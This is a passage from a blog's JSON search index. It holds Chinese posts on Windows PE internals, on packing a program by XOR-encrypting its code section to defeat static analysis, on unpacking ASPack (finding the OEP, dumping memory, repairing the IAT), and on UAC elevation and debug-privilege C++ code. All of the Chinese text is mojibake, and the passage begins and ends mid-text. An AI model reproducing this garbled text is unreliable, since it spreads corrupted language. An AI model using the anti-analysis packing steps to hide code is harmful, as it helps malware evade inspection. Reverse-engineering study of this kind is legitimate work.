å¯¼å‡ºè¡¨ã€å¯¼å…¥è¡¨ã€å¼‚å¸¸è¡¨ã€tlsè¡¨ã€èµ„æºè¡¨ã€IATã€é‡å®šä½è¡¨\n6ã€ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸‰ç¯ä¸‹æœ‰å“ªäº›æ•°æ®ç»“æ„ï¼Ÿ\n è¿›ç¨‹ç¯å¢ƒå—(PEB)ã€çº¿ç¨‹ç¯å¢ƒå—(TEB)ã€tlsç»“æ„\n7ã€å¯¼å…¥è¡¨ç»“æ„ä½“å­—æ®µæœ‰å‡ ä¸ªï¼Œåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\n 5ä¸ªå­—æ®µ\n ç¬¬ä¸€ä¸ªæ˜¯OrginalFirstThunk,é‡Œé¢æ˜¯rva,æŒ‡å‘çš„INTï¼Œ\n ç¬¬äºŒä¸ªæ˜¯æ—¶é—´æˆ³ï¼Œ\n ç¬¬ä¸‰ä¸ªæ˜¯è½¬å‘æœº åˆ¶ç”¨åˆ°çš„ForWarderChain,\n ç¬¬å››ä¸ªæ˜¯name,rva,dllåç§°å­—ç¬¦ä¸²ï¼Œ\n ç¬¬äº”ä¸ªæ˜¯FirstThunkï¼ŒæŒ‡å‘çš„æ˜¯ IATã€‚ INTæˆ–IATåœ¨æ–‡ä»¶ä¸­å­˜çš„æ˜¯ä¸€æ ·çš„ï¼Œå­˜çš„æ˜¯æŒ‡å‘åç§°å­—ç¬¦ä¸²çš„rvaæˆ–è€…ä¸€ä¸ªåºå·\næ‰‹å·¥åŠ å£³ç›®æ ‡ï¼šå°†ä»£ç æ®µåŠ å¯†ï¼Œä»¥é˜²æ­¢IDAç­‰é™æ€å·¥å…·åˆ†æã€‚\næ­¥éª¤ï¼š\n\næ·»åŠ ä¸€ä¸ªåŒºæ®µ(æ–‡ä»¶å¤§å°ã€åŒºæ®µæ•°é‡)\nå°†åŸOEPä¿®æ”¹ä¸ºæ–°åŒºæ®µä¸­çš„åœ°å€\nå°†ä»£ç æ®µå¼‚æˆ–åŠ å¯†\nåœ¨æ–°åŒºæ®µæ–°OEPå¤„ï¼Œæ·»åŠ å¼‚æˆ–è§£å¯†ä»£ç \n\næ³¨æ„: â‘  ä»£ç æ®µé»˜è®¤æ²¡æœ‰å¯å†™å±æ€§ï¼Œéœ€è¦ä¿®æ”¹ã€‚ â‘¡ æœ‰éšæœºåŸºå€å±æ€§çš„ç¨‹åºä¼šé‡å®šä½ä»£ç ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šå»æ‰è¿™ä¸ªå±æ€§ å¦‚æœæ²¡æœ‰å»æ‰ï¼Œå°±éœ€è¦åœ¨å£³ä»£ç ä¸­è¿›è¡Œé‡å®šä½\nå…·ä½“æ­¥éª¤æ·»åŠ åŒºæ®µ\n\nä½¿ç”¨LordPEç¼–è¾‘åŒºæ®µä¿¡æ¯\n\n\nå†ä½¿ç”¨010Editoræ·»åŠ æ–‡ä»¶æ•°æ®\n\n\nä¿®æ”¹OEPï¼Œå¢åŠ OEPä»£ç åŸOEPï¼š000011D2 æ–°OEPï¼š17000 ä¿®æ”¹OEP\n\n\næ·»åŠ ä»£ç \n\n\né€šè¿‡æŠ€å·§è·å–åŸºåœ°å€å†è·³è½¬\n\n\nå¦ä¸€ç§æ”¹æ³•\n\n\nå…³äºä»£ç çš„æ¼”åŒ–\nâ‘  å¦‚æœç›´æ¥å»æ‰éšæœºåŸºå€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ–°OEPå¤„ï¼Œç›´æ¥å†™ä»£ç è·³è½¬åˆ°åŸå§‹OEP\n\n\nâ‘¡ æˆ‘ä»¬å¯ä»¥åœ¨æ–°OEPå¤„å®šä¹‰å‡ºæ¨¡å—åŸºåœ°å€ï¼Œç„¶åå†åŠ ä¸ŠåŸå§‹OEP RVA\n\n\nâ‘¢ å¯ä»¥åœ¨æ–°OEPå¤„é€šè¿‡call pop ç»„åˆè·å–å½“å‰æŒ‡ä»¤åœ°å€ï¼Œå†å‡å»åç§»ï¼Œè®¡ç®—å‡ºæ¨¡å—åŸºå€\n\n\nä»¥ä¸Šä»£ç çš„æœºå™¨ç å¤åˆ¶åˆ°æœ‰éšæœºåŸºå€çš„åŒä¸€ç¨‹åºåŒä¸€ä½ç½®ä¸­ï¼ŒåŒæ ·ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸è¿è¡Œçš„\n\n\nåŠ å¯†ä»£ç æ®µä»£ç æ®µä¿¡æ¯\n\n\nåœ¨010Editorä¸­æ“ä½œä»£ç æ®µ\né€‰ä¸­ä»£ç æ®µ\n\n\nå¼‚æˆ–ä»£ç æ®µ\n\n\nå¢åŠ è§£å¯†ä»£ç ç”±äºä»£ç æ®µæœ¬èº«æœ‰é‡å®šä½ä¿¡æ¯ï¼Œé‚£ä¹ˆå¦‚æœåŠ å¯†ä¹‹åï¼Œé‡å®šä½ä¼šå‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥åº”è¯¥å»æ‰éšæœºåŸºå€ 40 81 -&gt; 00 81\n\n\nè„±å£³è„±å£³çš„ç›®çš„ï¼š\nCracker(ç ´è§£è€…) è„±å£³ã€è§£å¯†ã€ç ´è§£\næ€æ¯’å¼•æ“(è„±å£³å¼•æ“ã€åç—…æ¯’è™šæ‹Ÿæœº) è§£å¯†ã€æŸ¥æ€ç—…æ¯’ã€æ‰«æç‰¹å¾\n\nè„±å£³çš„æ­¥éª¤ï¼š\næ‰¾åˆ°åŸå§‹OEP\nä¸€èˆ¬æ¥è¯´ï¼Œæ‰¾åˆ°åŸå§‹OEPæˆ–è€…æˆ‘ä»¬è·Ÿè¸ªåˆ°åŸå§‹OEPæ—¶ï¼Œç¨‹åºéƒ½ä¼šå®Œæˆè§£å¯†æ“ä½œ\n\nDumpå†…å­˜åˆ°æ–‡ä»¶\nå½“å¯æ‰§è¡Œæ–‡ä»¶åœ¨å†…å­˜å·²ç»å®Œæˆè§£å¯†ä¹‹åï¼Œæˆ‘ä»¬å°†å†…å­˜ä¸­ä»£ç æ•°æ®è½¬å‚¨(dump)åˆ°æ–‡ä»¶ï¼Œå°±å¯ä»¥è¿› è¡Œè¿›ä¸€æ­¥åˆ†æã€‚\n\nä¿®å¤æ–‡ä»¶(å¸¸è§äºä¿®å¤IATï¼Œé‡å»ºå¯¼å…¥è¡¨)\nä»å†…å­˜ä¸­è½¬å‚¨çš„å†…å­˜æ•°æ®ä»£ç æœ‰ä¸€äº›ä¸åŸæœ¬æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯ä¸ä¸€è‡´çš„ã€‚æ¯”å¦‚è¯´IATè¡¨ï¼Œå†…å­˜ä¸­IAT è¡¨ä¼šè¢«åˆå§‹ä¸ºå‡½æ•°åœ°å€è¡¨ï¼Œè€Œæ–‡ä»¶ä¸­IATè¡¨ä¸INTè¡¨å†…å®¹ä¸€è‡´ã€‚æ‰€ä»¥è¦æƒ³è®©ç¨‹åºæ­£å¸¸è¿è¡Œï¼Œä¸€èˆ¬ éƒ½éœ€è¦ä¿®å¤IATï¼Œå› ä¸ºåŠ å£³ä¹‹åç¨‹åºä¸€èˆ¬éƒ½ä¼šè‡ªå·±å»å¤„ç†å¯¼å…¥è¡¨ã€IATä»¥åŠé‡å®šä½ç­‰ã€‚\n\n\nå¯¼å…¥è¡¨å’ŒIAT)\n\n\nè„±è‡ªå·±åŠ çš„å£³\næ‰¾åˆ°åŸå§‹OEP\nå•æ­¥è·Ÿè¸ªï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°åŸå§‹OEP\n\nDumpå†…å­˜åˆ°æ–‡ä»¶\nåœ¨åŸå§‹OEPå¤„è¿›è¡ŒDUMPå†…å­˜ï¼ŒåŸå› å°±æ˜¯è¿™ä¸ªæ—¶å€™å†…å­˜æ²¡æœ‰åšå¤ªå¤šçš„åˆå§‹åŒ–\n\n\n3.ä¿®å¤IATæˆ–è€…ä¿®å¤å¯¼å…¥è¡¨\nä½¿ç”¨ImportRECä¿®å¤\n\n\n\n\næ¦‚è¿°è„±å£³æ˜¯ä¸€é¡¹ç»¼åˆæŠ€æœ¯ï¼Œç»“åˆPEæ–‡ä»¶æ ¼å¼ã€æ±‡ç¼–æŒ‡ä»¤çš„åˆ†æï¼Œè°ƒè¯•åŠ å¯†çš„ç¨‹åºå¹¶å°†å…¶è¿˜åŸçš„ä¸€ ä¸ªè¿‡ç¨‹ã€‚\nå£³ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼ŒåŠ å¯†å£³å’Œå‹ç¼©å£³ï¼Œé‡Œé¢æ‰€ä½¿ç”¨çš„æŠ€æœ¯æœ‰ï¼Œå‹ç¼©ç®—æ³•ã€å¯¹ä»£ç åŠ å¯†ã€å¯¹IAT åŠ å¯†ã€å¯¹èµ„æºåŠ å¯†ã€‚ æˆ‘ä»¬ä»ç®€å•å…¥æ‰‹-å‹ç¼©å£³ã€‚\nå…³äºå‹ç¼©ç®—æ³•\næœ‰æŸå‹ç¼© ä¸€ä¸ªåƒç´ ç‚¹ï¼šRGB çº¢ç»¿è“ ä¸€ä¸ªå›¾ç‰‡ï¼š(3,4,5),(4,5,3),(5,4,3) å‹ç¼©åï¼š(4,4,4),3\næ— æŸå‹ç¼© ä¸€ä¸ªæ–‡ä»¶ï¼š0,0,0,0,0,0,0 å‹ç¼©åï¼š0,7\n\nè„±å£³ä¸‰æ­¥æ³•\nå¯»æ‰¾åŸå§‹OEP\ndumpå†…å­˜åˆ°æ–‡ä»¶\nä¿®å¤æ–‡ä»¶\n\nè„±å£³ä¸‰æ­¥æ³•-å¯»æ‰¾OEPæŠ€å·§\nå †æ ˆå¹³è¡¡æ³•(ESPå®šå¾‹\nå£³ä»£ç å°±åƒä¸€ä¸ªå‡½æ•°ï¼Œè¿›å…¥æ—¶ä¼šå¼€è¾Ÿå †æ ˆã€ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒï¼Œé€€å‡ºæ—¶ä¼šæ¢å¤å †æ ˆã€æ¢å¤ å¯„å­˜å™¨ã€‚æ‰€ä»¥åº”è¯¥æ˜¯å †æ ˆå¹³è¡¡çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åœ¨å£³ä»£ç æ“ä½œäº†å †æ ˆåå¯¹å †æ ˆè®¾ç½®è®¿é—®æˆ– å†™å…¥æ–­ç‚¹ï¼Œç„¶åè¿è¡Œç¨‹åºï¼Œå½“æ–­ç‚¹å‘½ä¸­çš„æ—¶å€™ï¼Œåº”è¯¥å°±æ˜¯é€€å‡ºå£³ä»£ç çš„æ—¶å€™ã€‚åœ¨å…¶é™„è¿‘ å•æ­¥å‡ æ¬¡ï¼Œåº”è¯¥å°±èƒ½åˆ°è¾¾ç¨‹åºçš„åŸå§‹OEPã€‚\n\nç‰¹å¾å®šä½æ³•\nåœ¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‰¹å¾æ¥å®šä½ç¨‹åºåŸå§‹OEPã€‚ç‰¹å¾æœ‰å‡ ç§ï¼š â‘  äºŒè¿›åˆ¶ç‰¹å¾ æ¯”å¦‚releaseç‰ˆçš„VS2013æ˜¯: oepå…¥å£ç‰¹å¾ï¼šE8????????E9 ç¬¬ä¸€ä¸ªCALLå†…çš„ç‰¹å¾:5657BF4EE640BBBE0000FFFF3BC7 â‘¡ APIç‰¹å¾ æ¯”å¦‚releaseç‰ˆçš„VS2013çš„ç¬¬ä¸€ä¸ªAPIè°ƒç”¨æ˜¯ï¼š GetSystemTimeAsFileTime æ¯”å¦‚vc6.0çš„ç¬¬ä¸€ä¸ªAPIè°ƒç”¨æ˜¯ï¼š GetVersion æ¯”å¦‚Delphiç¨‹åºç¬¬ä¸€ä¸ªAPIè°ƒç”¨æ˜¯ï¼š GetModuleHandleA â‘¢ç¼–è¯‘å™¨ç‰¹å¾ IATè°ƒç”¨ä¸åŒçš„ç¼–è¯‘å™¨ç”Ÿæˆçš„è°ƒç”¨æœºå™¨ç æ˜¯ä¸ä¸€æ · vs -ã€‹ call [IATåœ°å€] -ã€‹ FF15 xx xx xx xx delphi -&gt; jmp [IATåœ°å€] -ã€‹ FF25 xx xx xx xx\n\n\nè„±å£³ç»ƒä¹ å£³ä»£ç çš„åŸºæœ¬æµç¨‹â‘  ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒ\nâ‘¡ åŠ è½½ä¸€äº›å¿…è¦çš„API\nâ‘¢ è§£å¯†ä»£ç å’Œæ•°æ®\nâ‘£ ä¿®å¤é‡å®šä½\nâ‘¤ å¡«å……IAT\nâ‘¥ æ¢å¤å¯„å­˜å™¨ç¯å¢ƒ\nè„±å£³-0.aspack.exeå£³ä»£ç åˆ†æ1ã€å£³OEP\n\n2ã€åŠ è½½å¿…è¦API\n\n3ã€è§£å¯†è§£å‹ç¼©ä»£ç \n\n4ã€ä¿®å¤é‡å®šä½\n\nä¿®å¤é‡å®šä½çš„å…¬å¼ï¼š\né‡å®šä½è¡¨ä¸­å­˜å‚¨ä¸¤ä¸ªæœ‰ç”¨å­—æ®µï¼š\n\néœ€è¦é‡å®šä½çš„åˆ†é¡µåœ°å€\néœ€è¦é‡å®šä½çš„åˆ†é¡µåç§» é‡å®šä½åˆ†ä¸ºä¸¤æ­¥ï¼š\nè®¡ç®—å‡º é‡å®šä½åœ°å€ï¼Œè¦é‡å®šä½çš„åœ°å€&#x3D;æ¨¡å—åŸºåœ°å€+åˆ†é¡µåœ°å€+åˆ†é¡µåç§»\nä¿®å¤è¦é‡å®šä½çš„åœ°å€ä¸­æ•°æ®ï¼Œ[è¦é‡å®šä½çš„åœ°å€] - é»˜è®¤æ¨¡å—åŸºåœ°å€ + å½“å‰æ¨¡å—åŸºåœ°å€\n\n5ã€å¡«å……IATåŸç†ï¼š\nâ‘  ä»å¯¼å…¥è¡¨ä¸­è·å–dllåç§°\nâ‘¡ ä»å¯¼å…¥è¡¨ä¸­çš„INTï¼Œè·å–å‡½æ•°åç§°æˆ–è€…åºå·\nâ‘¢ é€šè¿‡GetModuleHandleAæˆ–è€…LoadLibraryAè·å–æ¨¡å—åŸºåœ°å€ã€é€šè¿‡GetProcAddressè·å–å‡½æ•°åœ°å€\nâ‘£ å°†å‡½æ•°åœ°å€å¡«å……åˆ°å¯¹åº”IATæ•°ç»„ä¸­\n001D726F 03F2 ADD ESI,EDX \t\t\t\t\t\t\t\t; esi&#x3D;å¯¼å…¥è¡¨ç»“æ„\n001D7271 8B46 0C MOV EAX,DWORD PTR DS:[ESI+0xC] \t\t; è·å–æ¨¡å—DLLåç§°RVA\n001D7274 85C0 TEST EAX,EAX\n001D7276 0F84 0D010000 JE 00_aspac.001D7389\n001D727C 03C2 ADD EAX,EDX \t\t\t\t\t\t\t\t; åŠ ä¸ŠåŸºåœ°å€ï¼Œå­—ç¬¦ä¸²VA\n001D727E 8BD8 MOV EBX,EAX\n001D7280 50 PUSH EAX\n001D7281 FF95 A90F0000 CALL DWORD PTR SS:[EBP+0xFA9] \t; è·å–æ¨¡å—åŸºåœ°å€\n001D7287 85C0 TEST EAX,EAX\n001D7289 75 07 JNZ SHORT 00_aspac.001D7292\n001D728B 53 PUSH EBX\n001D728C FF95 AD0F0000 CALL DWORD PTR SS:[EBP+0xFAD]\n001D7292 8985 A9050000 MOV DWORD PTR SS:[EBP+0x5A9],EAX ; ä¿å­˜æ¨¡å—åŸºåœ°å€\n001D7298 C785 AD050000&gt;MOV DWORD PTR SS:[EBP+0x5AD],0x0\n001D72A2 8B95 88040000 MOV EDX,DWORD PTR SS:[EBP+0x488] ; è·å–åŸºåœ°å€\n001D72A8 8B06 MOV EAX,DWORD PTR DS:[ESI] \t\t\t; è·å–æŒ‡å‘OrignalFirstTh\n001D72AA 85C0 TEST EAX,EAX\n001D72AC 75 03 JNZ SHORT 00_aspac.001D72B1\n001D72AE 8B46 10 MOV EAX,DWORD PTR DS:[ESI+0x10]\n001D72B1 03C2 ADD EAX,EDX \t\t\t\t\t\t\t; è®¡ç®—å¾—å‡º OrignalFirstT\n001D72B3 0385 AD050000 ADD EAX,DWORD PTR SS:[EBP+0x5AD] ; 0\n001D72B9 8B18 MOV EBX,DWORD PTR DS:[EAX] \t\t\t; è·å–INTä¸­çš„æ•°æ®ï¼Œå³æŒ‡å‘\n001D72BB 8B7E 10 MOV EDI,DWORD PTR DS:[ESI+0x10] \t; è·å– FirstThunk\n001D72BE 03FA ADD EDI,EDX \t\t\t\t\t\t\t; è®¡ç®—å¾—å‡º IAT åœ°å€\n001D72C0 03BD AD050000 ADD EDI,DWORD PTR SS:[EBP+0x5AD] ; 0\n001D72C6 85DB TEST EBX,EBX \t\t\t\t\t\t\t; åˆ¤æ–­ç»“æŸ\n001D72C8 0F84 A5000000 JE 00_aspac.001D7373\n001D72CE F7C3 00000080 TEST EBX,0x80000000 \t\t\t; åˆ¤æ–­æ˜¯å¦æ˜¯åºå·\n001D72D4 75 04 JNZ SHORT 00_aspac.001D72DA\n001D72D6 03DA ADD EBX,EDX \t\t\t\t\t\t\t; æŒ‡å‘å‡½æ•°å­—ç¬¦ä¸²ç»“æ„&#x3D;INT\n001D72D8 43 INC EBX \t\t\t\t\t\t\t\t; å‡å»2ï¼Œè·³è¿‡å­—ç¬¦ä¸²ç»“æ„çš„\n001D72D9 43 INC EBX\n001D72DA 53 PUSH EBX \t\t\t\t\t\t\t\t; ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒ\n001D72DB 81E3 FFFFFF7F AND EBX,0x7FFFFFFF\n001D72E1 53 PUSH EBX \t\t\t\t\t\t\t\t; å‹å…¥å­—ç¬¦ä¸²æˆ–æ˜¯åºå·\n001D72E2 FFB5 A9050000 PUSH DWORD PTR SS:[EBP+0x5A9]\n001D72E8 FF95 A50F0000 CALL DWORD PTR SS:[EBP+0xFA5] ; è·å–å‡½æ•°åœ°å€\n001D72EE 85C0 TEST EAX,EAX\n001D72F0 5B POP EBX \t\t\t\t\t\t\t\t\t; æ¢å¤å¯„å­˜å™¨ç¯å¢ƒ\n\nâ‘¤ ä¿®æ”¹å±æ€§ï¼Œè·³è½¬åŸå§‹OEP\n\n\nè„±å£³åˆ†æï¼ˆaspack.exe é‡å®šä½è¡¨åˆ†æï¼‰æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œè¿™ä¸ªå£³ä»£ç æ”¯æŒé‡å®šä½ï¼Œæ‰€ä»¥æœ€å¥½è¿™ä¸ªç¨‹åºè„±å®Œåä¹Ÿæ”¯æŒé‡å®šä½ï¼Œå¦‚æœæ„Ÿè§‰åˆ°éº»çƒ¦å¯ä»¥ç›´æ¥æ‰§è¡Œåˆ°OEPåç›´æ¥dumpå³å¯\n\n\n\n\né‡å®šä½è¡¨\nåç§»16000\nå¤§å°0xC74\næ”¯æŒé‡å®šä½çš„è„±å£³é¦–å…ˆä¸èƒ½è®©01257238 66:830E FF OR WORD PTR DS:[ESI],0xFFFF è¿™æ¡è¯­å¥æ‰§è¡Œï¼Œä»–ä¼šè®©è„±å£³ä¹‹åçš„ç¨‹åºè¿è¡Œæ‰¾ä¸åˆ°é‡å®šä½è¡¨\n","slug":"Windowsè„±å£³-åŸºç¡€","date":"2020-10-25T03:08:33.000Z","categories_index":"Windowså®‰å…¨","tags_index":"è„±å£³","author_index":"Akpigs"},{"id":"c0336200d69e06897233b94f464cbc3b","title":"ä»£ç æ³¨å…¥ä¸æ‹¦æˆª","content":"æƒé™æƒé™ç®¡ç†\n\nUACæœºåˆ¶ç®¡ç†æ–¹å¼åœ¨ç®¡ç†å‘˜è´¦æˆ·ä¸‹ï¼Œè¿è¡Œä¸€ä¸ªç¨‹åºï¼Œä¹Ÿæ˜¯ä½æƒé™ï¼Œåªæœ‰é€‰æ‹©ç®¡ç†å‘˜æ–¹å¼è¿è¡Œï¼Œæ‰ä¼šåˆ†é…é«˜æƒé™ã€‚\n\n\nè°ƒæ•´UACæ–¹æ³•1ï¼šgpedit\n\n\næ–¹æ³•2 ï¼šè®¾ç½®\n\n\nä½¿ç”¨æ¡ˆä¾‹BOOL CMy01UACDlg::OnInitDialog()\n&#123;\n\tCDialogEx::OnInitDialog();\n\n\n\t&#x2F;&#x2F; ç»™æŒ‰é’®åŠ å°ç›¾ç‰Œ\n\t&#x2F;&#x2F; 3. åˆ¤æ–­å…·ä½“çš„æƒé™çŠ¶å†µ\n\n\n\t&#x2F;&#x2F; 1. è·å¾—æœ¬è¿›ç¨‹çš„ä»¤ç‰Œ\n\tHANDLE hToken &#x3D; NULL;\n\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken))\n\t\treturn false;\n\t&#x2F;&#x2F; 2. è·å–æå‡ç±»å‹\n\tTOKEN_ELEVATION_TYPE ElevationType &#x3D; TokenElevationTypeDefault;\n\tBOOL                 bIsAdmin &#x3D; false;\n\tDWORD                dwSize &#x3D; 0;\n\tif (GetTokenInformation(hToken, TokenElevationType, &amp;ElevationType,\n\t\tsizeof(TOKEN_ELEVATION_TYPE), &amp;dwSize)) &#123;\n\t\t&#x2F;&#x2F; 2.1 åˆ›å»ºç®¡ç†å‘˜ç»„çš„å¯¹åº”SID\n\t\tBYTE adminSID[SECURITY_MAX_SID_SIZE];\n\t\tdwSize &#x3D; sizeof(adminSID);\n\t\tCreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &amp;adminSID, &amp;dwSize);\n\t\t&#x2F;&#x2F; 2.2 åˆ¤æ–­å½“å‰è¿›ç¨‹è¿è¡Œç”¨æˆ·è§’è‰²æ˜¯å¦ä¸ºç®¡ç†å‘˜\n\t\tif (ElevationType &#x3D;&#x3D; TokenElevationTypeLimited) &#123;\n\t\t\t&#x2F;&#x2F; a. è·å–è¿æ¥ä»¤ç‰Œçš„å¥æŸ„\n\t\t\tHANDLE hUnfilteredToken &#x3D; NULL;\n\t\t\tGetTokenInformation(hToken, TokenLinkedToken, (PVOID)&amp;hUnfilteredToken,\n\t\t\t\tsizeof(HANDLE), &amp;dwSize);\n\t\t\t&#x2F;&#x2F; b. æ£€æŸ¥è¿™ä¸ªåŸå§‹çš„ä»¤ç‰Œæ˜¯å¦åŒ…å«ç®¡ç†å‘˜çš„SID\n\t\t\tif (!CheckTokenMembership(hUnfilteredToken, &amp;adminSID, &amp;bIsAdmin))\n\t\t\t\treturn false;\n\t\t\tCloseHandle(hUnfilteredToken);\n\t\t&#125;\n\t\telse &#123;\n\t\t\tbIsAdmin &#x3D; IsUserAnAdmin();\n\t\t&#125;\n\t\tCloseHandle(hToken);\n\t&#125;\n\tBOOL bFullToken &#x3D; false;\n\tswitch (ElevationType) &#123;\n\tcase TokenElevationTypeDefault: &#x2F;* é»˜è®¤çš„ç”¨æˆ·æˆ–UACè¢«ç¦ç”¨ *&#x2F;\n\t\tif (IsUserAnAdmin())  bFullToken &#x3D; true; &#x2F;&#x2F; é»˜è®¤ç”¨æˆ·æœ‰ç®¡ç†å‘˜æƒé™\n\t\telse                  bFullToken &#x3D; false;&#x2F;&#x2F; é»˜è®¤ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜ç»„\n\t\tbreak;\n\tcase TokenElevationTypeFull:    &#x2F;* å·²ç»æˆåŠŸæé«˜è¿›ç¨‹æƒé™ *&#x2F;\n\t\tif (IsUserAnAdmin())  bFullToken &#x3D; true; &#x2F;&#x2F;å½“å‰ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ\n\t\telse                  bFullToken &#x3D; false;&#x2F;&#x2F;å½“å‰æœªä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ\n\t\tbreak;\n\tcase TokenElevationTypeLimited: &#x2F;* è¿›ç¨‹åœ¨ä»¥æœ‰é™çš„æƒé™è¿è¡Œ *&#x2F;\n\t\tif (bIsAdmin)  bFullToken &#x3D; false;&#x2F;&#x2F;ç”¨æˆ·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œä½†è¿›ç¨‹æƒé™æœ‰é™\n\t\telse           bFullToken &#x3D; false;&#x2F;&#x2F;ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜ç»„ï¼Œä¸”è¿›ç¨‹æƒé™æœ‰é™\n\t&#125;\n\t&#x2F;&#x2F; 4. æ ¹æ®æƒé™çš„ä¸åŒæ§åˆ¶æŒ‰é’®çš„æ˜¾ç¤º\n\tif (!bFullToken)\n\t\tButton_SetElevationRequiredState(::GetDlgItem(m_hWnd, IDC_BUTTON1),!bFullToken);\n\telse\n\t\t::ShowWindow(::GetDlgItem(m_hWnd, IDC_BUTTON1), SW_HIDE);\n\treturn TRUE;  &#x2F;&#x2F; é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE\n&#125;\n\n\nvoid CMy01UACDlg::OnBnClickedButton1()\n&#123;\n\t&#x2F;&#x2F; TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç \n\t&#x2F;&#x2F;ä»¥UACçš„æ–¹å¼ï¼Œé‡æ–°å¯åŠ¨ç¨‹åº\n\t\t&#x2F;&#x2F; 1. è·å¾—æœ¬è¿›ç¨‹çš„ä»¤ç‰Œ\n\n\t&#x2F;&#x2F; 1. éšè—å½“å‰çª—å£\n\tShowWindow(SW_HIDE);\n\t&#x2F;&#x2F; 2. è·å–å½“å‰ç¨‹åºè·¯å¾„\n\tWCHAR szApplication[MAX_PATH] &#x3D; &#123; 0 &#125;;\n\tDWORD cchLength &#x3D; _countof(szApplication);\n\tQueryFullProcessImageName(GetCurrentProcess(), 0,\n\t\tszApplication, &amp;cchLength);\n\t&#x2F;&#x2F; 3. ä»¥ç®¡ç†å‘˜æƒé™é‡æ–°æ‰“å¼€è¿›ç¨‹\n\tSHELLEXECUTEINFO sei &#x3D; &#123; sizeof(SHELLEXECUTEINFO) &#125;;\n\tsei.lpVerb &#x3D; L&quot;runas&quot;;      &#x2F;&#x2F; è¯·æ±‚æå‡æƒé™\n\tsei.lpFile &#x3D; szApplication; &#x2F;&#x2F; å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„\n\tsei.lpParameters &#x3D; NULL;          &#x2F;&#x2F; ä¸éœ€è¦å‚æ•°\n\tsei.nShow &#x3D; SW_SHOWNORMAL; &#x2F;&#x2F; æ­£å¸¸æ˜¾ç¤ºçª—å£\n\tif (ShellExecuteEx(&amp;sei))\n\t\texit(0);\n\telse\n\t\tShowWindow( SW_SHOWNORMAL);\n&#125;\n\n\nvoid CMy01UACDlg::OnBnClickedButton2()\n&#123;\n\tEnableDebugPrivilege(TRUE);\n&#125;\n\nBOOL CMy01UACDlg::EnableDebugPrivilege(BOOL fEnable) &#123;   &#x2F;&#x2F;æå‡ä¸ºè°ƒè¯•æƒé™\n\tBOOL fOk &#x3D; FALSE;    HANDLE hToken;\n\t&#x2F;&#x2F; ä»¥ä¿®æ”¹æƒé™çš„æ–¹å¼ï¼Œæ‰“å¼€è¿›ç¨‹çš„ä»¤ç‰Œ\n\tif (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,\n\t\t&amp;hToken)) &#123;\n\t\t&#x2F;&#x2F; ä»¤ç‰Œæƒé™ç»“æ„ä½“\n\t\tTOKEN_PRIVILEGES tp;\n\t\ttp.PrivilegeCount &#x3D; 1;\n\t\t&#x2F;&#x2F;è·å¾—LUID\n\t\tLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);\n\t\ttp.Privileges[0].Attributes &#x3D; fEnable ? SE_PRIVILEGE_ENABLED : 0;\n\t\tAdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); &#x2F;&#x2F;ä¿®æ”¹æƒé™\n\t\tfOk &#x3D; (GetLastError() &#x3D;&#x3D; ERROR_SUCCESS);\n\t\tCloseHandle(hToken);\n\t&#125;\n\treturn(fOk);\n&#125;\n\nå†…å­˜ç®¡ç†Windowsç³»ç»Ÿä½¿ç”¨è™šæ‹Ÿå†…å­˜çš„å¥½å¤„æ˜¯ä»€ä¹ˆ\na) æ— è®ºç‰©ç†å†…å­˜å®é™…æœ‰å¤šå¤§ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰4GBçš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚b) æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä½¿ç”¨ä¸Šéƒ½æ˜¯ç›¸ä¼¼çš„ï¼Œä½2GBæ˜¯ç”¨æˆ·ç©ºé—´ï¼Œé«˜2GBæ˜¯ç³»ç»Ÿç©ºé—´ï¼Œä½2GBçš„ç”¨æˆ·ä»£ç ç©ºé—´çš„ä»£ç æ— æ³•è®¿é—®é«˜2GBç³»ç»Ÿç©ºé—´ã€‚c) åœ¨è¿›ç¨‹ä¸­ä½¿ç”¨çš„å…¨éƒ¨éƒ½æ˜¯è™šæ‹Ÿåœ°å€ï¼Œå…·ä½“è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„è½¬æ¢ç”±æ“ä½œç³»ç»Ÿå†…æ ¸å®Œæˆï¼Œæ•…è€Œä½ æ— æ³•åœ¨è‡ªå·±çš„è¿›ç¨‹ä¸­è®¿é—®åˆ°å…¶ä»–è¿›ç¨‹çš„å†…å­˜ï¼Œè™½ç„¶å¤§å®¶çš„åœ°å€é•¿å¾—å¦‚æ­¤ç±»ä¼¼ã€‚d) 